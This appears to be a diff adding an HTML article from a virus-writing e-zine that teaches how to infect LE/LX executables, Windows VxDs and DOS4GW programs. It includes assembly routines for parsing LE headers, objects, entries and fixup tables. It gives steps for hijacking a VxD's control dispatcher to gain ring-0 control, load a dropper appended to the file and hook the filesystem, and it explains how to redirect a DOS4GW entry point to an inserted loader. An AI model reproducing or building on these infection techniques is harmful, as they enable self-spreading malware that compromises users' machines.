@@ -1,0 +1,555 @@
+<html>
+<head>
+<title>LE/LX infection  / Navrhar (*zine #2)</title>
+</head>
+
+<body bgcolor="#ffffff" text="#000000" link="#303030" vlink="#303030" alink="#303030">
+
+<font face="Arial,Verdana,Helvetica">
+<img src=lelx.gif align=bottom><br><br>
+
+<p align=justify>
+In this article I will announce my aproach to infection of strange
+platforms as are Windows VxD or dos DOS4GW. Both platforms are running
+under similar environment - in FLAT memory model both are extended 32-bit
+so this is the reason why I have dealed with both of them.</p>
+
+<p align=justify><big>So let's start</big><br>
+
+In both cases we will infect host with small loader, that will load and
+execute main part of virii. This strategy is nice because there is no
+code executed in last section and so on.<br>
+LE (as I will call LX too, because there are similar or even the same), is
+intel friendly, because it uses 4096 bytes long pages. Each section is
+aligned to page. This means, that in average case 2000 bytes in code section
+is unused and free. Nice, isn't it :-). This wasting of space we will use
+to insert our short "loader" that will load other stuff from end of file
+(if you want, it may be placed elsewhere, or you may groove last section - i
+have a feeling that there may be debug info or other shit, so not so fast)
+and execute it. Because of flat model and you never knows where will you be
+loaded, this piece of code must be self-relocating. Enough of talking, go on.
+</p><p align=justify>
+VxD starts as regular dos-executable with pointer to next header at 3Ch
+(just like in PE). With DOS4GW it is a bit difficult. DOS4GW starts with
+some stupid stub, that will load main LE/LX executable. I don't deal with
+this too much, I just looked at some Dos4GW and wrote this part of code
+
+</p><p>readfile is macro as follows:</p>
+</font><ul><pre><code>  readfile ofs, size, buf
+  reads at offset ofs+file_base+objectr size bytes to buffer buf
+
+
+      ; check if WATCOM ? loader
+      mov    file_base, 0                  ; base of start of LX (to skip stubs)
+      mov    objectr, 0
+
+      cmp    byte ptr infmode, INF_DOS4
+      jne    short continue_vxd
+
+      readfile 0h 16 le_header             ; check exe signature
+      cmp    word ptr le_header, 'ZM'
+      je     short ok001
+      cmp    word ptr le_header, 'MZ'
+      jne    novalidvxd
+ok001:
+
+      movzx  esi, word ptr [le_header+4]
+      dec    esi
+      shl    esi, 9
+      movzx  ebx, word ptr [le_header+2]
+      add    esi, ebx
+
+      readfile esi 24h le_header
+      cmp    word ptr [le_header], 5742h   ; some kind of executable?
+      jne    short continue_vxd
+      add    esi, dword ptr [le_header+20h]
+      mov    file_base, esi
+
+continue_vxd:</code></pre></ul><font face="Arial,Verdana,Helvetica">
+
+
+<p align=justify>now file_base should point to regular DOS 'MZ' exacutable with dword at 3ch
+set as it should have. So just get start of LE header like this and check
+some formalities:</p>
+
+</font><ul><pre><code>        readfile 3ch 4 le_seek
+
+        ; read le header
+        readfile le_seek 100h le_header
+
+        ; check 4 signature
+        cmp    word ptr le_header, 'EL'
+        jne    nole
+
+        ; check if pages are 4096 bytes long
+        cmp    dword ptr le_header+28h, 1000h
+        jne    nole
+        ; ...</code></pre></ul><font face="Arial,Verdana,Helvetica">
+
+
+<p align=justify>Now we have to understand some LE specific stuff. At first LE is fragmented
+to sections (similary like PE). Sections are called Objects here.
+Objects are in header and there is usually not enough space to create your
+own object. This code will compute offset of eax-th section descriptor: </p>
+
+</font><ul><pre><code>        ; compute object descriptor offset in file (relative to file_base)
+        ; eax - object num
+getobjptr:
+        shl   eax, 3
+        lea   eax, [eax+2*eax-24]       ; first object is num 1
+        add   eax, dword ptr le_header+40h
+        add   eax, leseek
+        ret</code></pre></ul><font face="Arial,Verdana,Helvetica">
+
+<p align=justify>Object descriptor structure is as follows:</p>
+
+</font><ul><pre><code>  object_desc label byte ; object info record
+  virtsize  dd 0      ; object virtual size
+  virtbase  dd 0      ; object virtual base
+  flags     dd 0      ; flags
+  pageindex dd 0      ; page index ...
+  pageen3z  dd 0      ; num of page entriez
+            dd 0      ; alignment?
+  object_desc_len = $-object_desc</code></pre></ul><font face="Arial,Verdana,Helvetica">
+
+<p align=justify>This offset of object in file should be computed as </p>
+      </font><center><code>objectr = *(dword *)[le_header+80h] + pageindex&lt;&lt;12</code></center><font face="Arial,Verdana,Helvetica">
+
+<p align=justify>Object in file is (of course) not fragmented. It starts at objectr and
+ends at (objectr+pageen3z&lt;&lt;12-1) </p>
+
+<p align=justify>The second new entity in LE are entries. This is some kind of exports in
+PE. This is how to assume offset of eax-th entry:
+(objectr will point to start of entry). </p>
+
+</font><ul><pre><code>; this will assume entry eax (read and write will be relative to this)
+; assume entry      eax - entry num
+le_assume_entry:
+        ; relative to header
+        mov   edx, leseek
+        mov   objectr, edx
+
+        ; get entry offset in file
+        add   eax, eax
+        lea   eax, [eax+4*eax+1]        ; * 10 + 1
+        add   eax, dword ptr le_header[5ch]
+
+        ; read entry descriptor
+        mov   ecx, 10
+        lea   edx, buffer
+        call  rdfile
+
+        ; get object num
+        movzx  eax, word ptr buffer+1
+
+        ; assume this object
+        call   le_assume_object
+
+        ; add relative entry offset
+        mov    eax, dword ptr buffer+4
+        add    objectr, eax
+        mov    objoffset, eax
+        ret</code></pre></ul><font face="Arial,Verdana,Helvetica">
+
+
+</p><center><img src=asepar.gif></center><p align=justify>
+
+<p align=justify>And the last thing you need to know about are relocations. Because code
+may be stored anywhere between 0-4GB, each access to memory has to be
+relocated. (The only one exceptions are jumps which are relative to itself).
+Because of this LE has very complex structure of relocation (much more
+complicated than PE). Because of complex structure of relocations, many
+compilers are seting values to be relocated to 0.<br>
+If you really want to deal with this i will advise
+you to some documentation. But if you don't this is a fragment of code that
+scans for relocation: </p>
+
+<p align=justify>This is code i wrote to parse relocation table and to find some
+relocation that relocates eax:
+I wrote it so far ago so i will be not trying to explan this - just
+see documentation (as far as i know there is no good documentation :-( ). </p>
+
+</font><ul><pre><code>; finds fixup for eax in fixup table that relocates eax
+; sets fixupptr = ptr to entry in fixup table (relative to filestart)
+; parses whole fixup table in order to find an entry and create relo map
+; eax = pointer to find
+
+find_fixup:
+        mov      edi, eax
+
+        xor      eax, eax
+        mov      fixupptr, eax
+        mov      fix32, al
+        mov      fix_important, al
+
+        ; allocate table for relos
+        mov      eax, RELO_TABLE_SIZE/8
+        mod_call md_alloc
+        mov      relo_map_ptr, eax
+
+        ; make whole area unusable
+        push     edi
+        mov      edi, eax
+
+        xor      eax, eax
+        dec      eax
+        mov      ecx, RELO_TABLE_SIZE/8/4
+        rep      stosd
+
+        pop      edi
+
+
+        ; walk across all objects and process some of them
+
+        xor      eax, eax
+        inc      eax
+
+@@loop_section:
+        push     eax
+
+        ; eax = object ptr
+        call     le_assume_object
+
+        mov      eax, leseek
+        mov      objectr, eax   ; base to LE filestart
+
+        test     flags, 10100000b
+        jnz      @@skip_this_object
+
+
+        mov      eax, objpage
+        mov      temp_base, eax
+
+        ; get size of object
+        mov      ecx, pageen3z
+        push     ecx
+        shl      ecx, 12
+        call     zero_out_block
+
+        pop      ecx
+        mov      eax, pageindex
+        ; walk through page map and fixup entries
+
+@@process_page:
+        push     eax ecx
+
+        ; load item
+
+        ; 4 bytes long entry
+        dec      eax
+        shl      eax, 2
+        add      eax, dword ptr [LE_header +48h]
+
+        mov      ecx, size page_map_table_entry
+        lea      edx, page_desc
+        call     rdfile
+
+; doesn't work on VxD LE files
+;        cmp      page_desc.page_type, 0
+;        je       @@hardcopy_no_work
+
+        movzx    eax, page_desc.fixup_index
+        xchg     al, ah
+
+        ; now get ptr to relocation by index
+        push     eax
+        dec      eax
+        shl      eax, 2
+        add      eax, dword ptr [LE_header+68h]
+
+        lea      edx, fixup_cur
+        xor      ecx, ecx
+        mov      cl, 8
+        call     rdfile ; in this table is one entry with no meaning, just
+                        ; identifying end
+
+        pop      eax
+
+        mov      ecx, fixuptrnext
+        mov      eax, fixup_cur
+        sub      ecx, eax
+
+        add      eax, dword ptr [LE_header+6ch]
+
+        ; eax points to fixup table
+
+        ; process ecx bytes from fixup record
+        add     ecx, eax
+
+        sub     edi, temp_base
+
+@@loop_this_page:
+        cmp     eax, ecx
+        jae     @@just_done
+
+@@cont_relo:
+        push    eax ecx
+
+        ; load relocation in buffer
+        lea     edx, buffer
+        mov     ecx, 20h
+        call    rdfile
+
+
+        ; process relocation
+        lea     esi, buffer
+        xor     eax, eax
+
+        ; get first byte
+        lodsw
+        mov     ecx, eax
+
+        ; test if single
+        test    cl, 20h
+        jnz     @@multiple1
+
+        lodsw
+        call    set_eax
+
+        cmp     eax, edi
+        sete    fix_important
+
+        jmp     @@not_multi
+
+@@multiple1:
+
+        lodsb   ; count
+        mov     dl, al
+
+@@not_multi:
+
+        ; check for unknown relocation
+        mov     eax, ecx
+        and     ax, 0001100001111b
+        cmp     ax, 7h
+        je      @@type_78
+        cmp     ax, 8h
+        je      @@type_78
+
+;        marker 'unknown relocation'
+;        raise_x INF_FILE_FATAL
+
+@@type_78:
+
+        ; assume object is 8 bit
+        lodsb
+        ; if important object store ptr and size
+        cmp     fix_important, 1
+        jne     @@no_important
+
+        mov     fixupptr, esi
+        sub     fixupptr, offset cs:buffer
+        mov     eax, dword ptr [esp+4]
+        add     fixupptr, eax
+        mov     eax, objectr
+        add     fixupptr, eax
+        xor     eax, eax
+
+        test    ch, 10h
+        setnz   fix32
+
+@@no_important:
+        lodsw
+        test    ch, 10h ; check if 32-bit
+        jz      @@fixed
+        lodsw
+
+@@fixed:
+
+        test    cl, 20h
+        jz      @@nomultiple2
+
+        mov     @@prefix, 66h
+        test    cl, 10h
+        jz      @@no_prefix_chg
+
+;        marker  '32-bit repeated relo'
+        mov     @@prefix, 90h
+
+@@no_prefix_chg:
+
+        movzx   ecx, dl
+@@enz:
+@@prefix db 66h, 0adh    ; lodsw
+
+        call    set_eax
+
+        loop    @@enz
+
+@@nomultiple2:
+
+        pop     ecx eax
+
+        sub     esi, offset cs:buffer
+        add     eax, esi
+
+        jmp     @@loop_this_page
+@@just_done:
+
+        add     edi, temp_base
+
+        ; done
+
+@@hardcopy_no_work:
+        pop      ecx eax
+
+        inc      eax
+
+        add      temp_base, 1000h
+
+        dec      ecx
+        jnz      @@process_page
+
+
+
+@@skip_this_object:
+
+        pop      eax
+        inc      eax
+        cmp      eax, dword ptr [le_header+44h]  ; cnt of objects
+        jbe      @@loop_section
+
+        ret
+
+set_eax:
+        push  eax ebx
+        add   eax, temp_base
+        shr   eax, RELO_TABLE_BLOCK_SIZE
+
+        cmp   eax, RELO_TABLE_UPPER_LIMIT
+        ja    @@err
+
+        mov   ebx, relo_map_ptr
+
+        btr   dword ptr [ebx], eax
+
+        pop   ebx  eax
+        ret
+@@err:  ;marker 'RELO_TABLE_EXCEED'
+        pop   ebx  eax
+        ret
+
+
+zero_out_block:
+        push  eax ebx ecx
+
+        mov   ebx, relo_map_ptr
+
+        shr   eax, RELO_TABLE_BLOCK_SIZE
+
+@@zero_out_next:
+        btr   dword ptr [ebx], eax
+        inc   eax
+        cmp   eax, RELO_TABLE_UPPER_LIMIT
+        jae   @@cln_exceed
+        sub   ecx, (1 shl RELO_TABLE_BLOCK_SIZE)
+        jb    @@zero_out_next
+
+@@cln_exceed:
+        pop   ecx ebx eax
+        ret</code></pre></ul><font face="Arial,Verdana,Helvetica">
+
+
+<center><img src=asepar.gif></center><p align=justify>
+
+<big>This is way i proceed VxDs:</big>
+
+<ol><li>some check<br>
+
+</font><ul><pre><code>        mov    eax, dword ptr le_header+18h ; entry object
+        or     eax, dword ptr le_header+1ch ; entry offset
+        jne    novxd          ; seems to be a real executable ! ; UPDATE</code></pre></ul><font face="Arial,Verdana,Helvetica">
+</li>
+<li>check if there is enough space in code section. i assume code
+           section is section 1 (first section).</li>
+
+<li>assume DDB entry - this is entry that describes VxD in Windows
+        this contains pointer to control dispatcher. This is a functions
+        that handles various events, and this is how we get to turn. Pointer
+        to dispatcher is first 4-bytes of DDB</li>
+
+<li>find fixup for dispatcher</li>
+
+<li>write your code to end of code section, groove this section and
+           change fixup to start of your code. be sure that after end of
+           your loader you return control to previous dispatcher.
+           Note: the value of relocation is more trustable than value in DDB</li>
+</ol>
+</p><center><img src=asepar.gif></center><p align=justify>
+
+<big>And what your dispatcher should do:</big>
+<ol><li>test for special event (number in eax). I used 2 (Init_Complete)
+           that is sent to all VxDs after init of windows is complete.</li>
+
+<li>check wether there is anybody resident (because you are at VxD
+           level, you have full control of computer, you don't need to
+           have multiple instances)</li>
+
+<li>load your dropper from end of file (file name will be stored by
+           infection - vxd should not be moved)</li>
+
+<li>run your code</li>
+</ol>
+</p><center><img src=asepar.gif></center><p align=justify>
+
+<big>Some hints on ring 0</big>
+<ul><li>
+	Of course after your code is running in the memory you may do anything
+        what may a regular VxD do. There are no restrictions. At first because
+        interface for VxD calls. Every VxD call looks like this:
+
+</font><ul><pre><code>                db 0cdh, 20h, xx, xx, xx, xx</code></pre></ul><font face="Arial,Verdana,Helvetica">
+
+        where xx xx xx xx is number of service. It means there are no imports
+        and exports needed. After this code is executed it is patched to
+
+</font><ul><pre><code>                call dword ptr [addr]</code></pre></ul><font face="Arial,Verdana,Helvetica">
+
+        where addr is pointer to some internal table where is stored pointer
+        to function. You must agree this was designed for viruses to get
+        control over service. This may be useful, when you want to check wether
+        you are resident or not.</li>
+
+<li>About hooking filesystem just see IFS_Mgr_InstallFileSystemApiHook</li>
+
+<li>And for last dont forget in_resident flag and mutexes or other
+        synchronizing stuff.</li>
+</ul>
+<p>That's all about this .... happy coding
+
+</p><center><img src=asepar.gif></center><p align=justify>
+
+<big>And now some few words about DOS4GW LE:</big><br>
+
+	In DOS4GW you may relay to DPMI (that should be supportet quite good)
+        under any platform it works.</p>
+
+<ol><li>get entry point at le_header+1ch is offset (relative to start of section
+	   and at le_header+18h is object no</li>
+
+<li>groove object (if enough space) and store loader at end of section</li>
+
+<li>set new entry offset</li>
+</ol>
+<p>You don't need to deal with fixupps and other shit.</p>
+
+<p>Your loader will do this:</p>
+
+<ol><li>start with short jump followed by "WATCOM" if this is not loader
+           will say something like "Invalid executable" and
+           this is way how to test wether executable is compiled by WATCOM too</li>
+
+<li>load code from end of file and run it
+           (environment segment is at ES:2C like usually, you may use dos
+            services (int 21h) and DPMI (int 31h) - that is all you need)</li>
+</ol>
+
+<p>As you see DOS4GW is pretty easy target ...
+</p><center><img src=asepar.gif></center><p align=justify>
+
+What to say at the end? ... do your best!</p>
+</body>
+</html>
+
+
+
